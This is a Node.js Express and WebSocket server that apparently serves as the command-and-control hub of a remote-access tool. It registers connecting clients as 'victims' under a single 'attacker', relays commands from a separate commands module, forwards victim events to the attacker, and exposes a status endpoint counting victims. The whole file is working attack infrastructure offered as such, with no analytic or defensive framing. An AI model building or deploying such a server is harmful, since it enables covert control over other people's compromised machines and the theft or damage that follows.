const commands = require("./commands");
const express = require("express");
const colors = require("colors");
const extIP = require("ext-ip")();
const uuid = require("uuid");
const log = require("./log");

const app = express();

require("express-ws")(app);
require("dotenv").config();

const clients = [];
const broadcast = (message, id) => {
  clients
    .filter((client) => client.id !== id)
    .forEach((client) => {
      client.ws.send(JSON.stringify({ id, message }));
    });
};

const victims = [];
let attacker = {};


// This will notify the attacker, meaning from:
// Server => Attacker (WSMID/id=victim_id)

function alert(args = [], victim_id, type = "incoming") {
  if (isAttackerOnline()) {
    if (typeof args !== "object")
      args = {
        message: args,
      };

    attacker.ws.send(
      JSON.stringify({
        id: victim_id,
        type,
        args,
      }),
    );
  }
}

const isAttackerOnline = () => attacker.ws && attacker.ws.readyState === 1;
const isAttacker = (id) => attacker.id === id;

/**
 * @param {string} id
 * @param {WebSocket} ws
 * @param {Object} message
 */
function main(message, ws, id) {
  function reply(args = [], type = "invalid_message") {
    // where id is the id of the client that sent the message

    if (typeof args !== "object")
      args = {
        message: args,
      };

    ws.send(
      JSON.stringify({
        id,
        type,
        args,
      }),
    );
  }

  let { type, args } = message;
  if (!type || !args) return reply("invalid message");

  // We don't need to check if the sender is an attacker or not,
  // Because the commands[type]() will check if the sender is an attacker or not.
  // And handle both cases together in the code.

  Object.setPrototypeOf(commands, null);
  let command = commands[type];

  if (!command) return reply("invalid command");
  else
    command({
      args,
      reply,
      id,
      ws,
      clients,
      victims,
      attacker,
      broadcast,
      alert,
      isAttacker,
    });
}

app.ws("/entry", function (ws, req) {
  function reply(args = {}, type = "invalid_command") {
    // where id is the id of the client that sent the message

    if (typeof args !== "object")
      args = {
        message: args,
      };

    ws.send(
      JSON.stringify({
        id,
        type,
        args,
      }),
    );
  }

  const id = uuid.v4();
  clients.push({ id, ws });

  log.tell("New Connection: " + id, colors.green);

  reply({ id }, "connection_id"); // tell the client it's ID.

  ws.on("message", function incoming(message) {
    log.tell("Received: " + message, colors.bold);

    try {
      message = JSON.parse(message.toString());
    } catch {
      message = null;
    }

    if (message) main(message, ws, id);
    else {
      reply("Invalid JSON format.", "invalid_json");
      log.tell("Non-formatted JSON.", null, true);
    }
  });

  ws.on("close", function close() {
    log.tell("Client disconnected: " + id, colors.red);

    clients.splice(
      clients.findIndex((client) => client.id === id),
      1,
    );

    if (isAttacker(id)) attacker = {};
    else
      victims.splice(
        victims.findIndex((victim) => victim.id === id),
        1,
      );
  });
});

app.get("/", (req, res) => {
  res.send("Hello World!");
});

app.get('/status', (req, res) => {
  res.send(JSON.stringify({
    clients: clients.length,
    victims: victims.length,
    attacker: !!attacker.id
  }));
});

const port = process.env['PORT'] || 8080;

app.listen(port, () => {
  extIP.get().then((ip) => {
    log.tell("Server started on port: " + port, colors.green);
  });
});
